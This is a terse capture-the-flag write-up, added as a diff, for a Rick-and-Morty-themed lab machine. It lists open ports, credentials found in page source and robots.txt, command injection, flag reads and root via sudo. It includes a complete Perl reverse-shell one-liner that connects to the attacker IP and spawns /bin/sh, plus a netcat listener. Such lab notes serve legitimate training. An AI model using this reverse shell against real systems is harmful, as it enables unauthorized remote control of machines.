@@ -1,0 +1,60 @@
+IP attacker: 10.4.88.80
+IP victim: 10.10.51.180
+
+-------------------------
+TCP Port
+22 OpenSSH 7.2p2
+80 Apace httpd 2.4.8
+
+-------------------------
+22-SSH
+enumerate username
+
+-------------------------
+80-HTTP
+
+Username: R1ckRul3s (source code)
+Password: Wubbalubbadubdub (/robots.txt)
+Login: 10.10.51.180/login
+
+-------------------------
+test cmd injection
+
+ls -la
+
+-------------------------
+read first flag
+
+strings Sup3rS3cretPickl3Ingred.txt
+
+-------------------------
+read second flag
+
+cd /; cd home; cd rick; strings 'second ingredients'
+
+-------------------------
+check permission
+
+sudo -l
+
+-------------------------
+create TCP reverse shell
+
+perl -e 'use Socket;$i="10.4.88.80";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+------------------------
+open port on computer
+
+nc -nlvp 8888
+
+----------------------
+Privileges escalation
+
+sudo su(update to root)
+cd root
+strings 3rd.txt
+
+----------------------
+Done
+
+
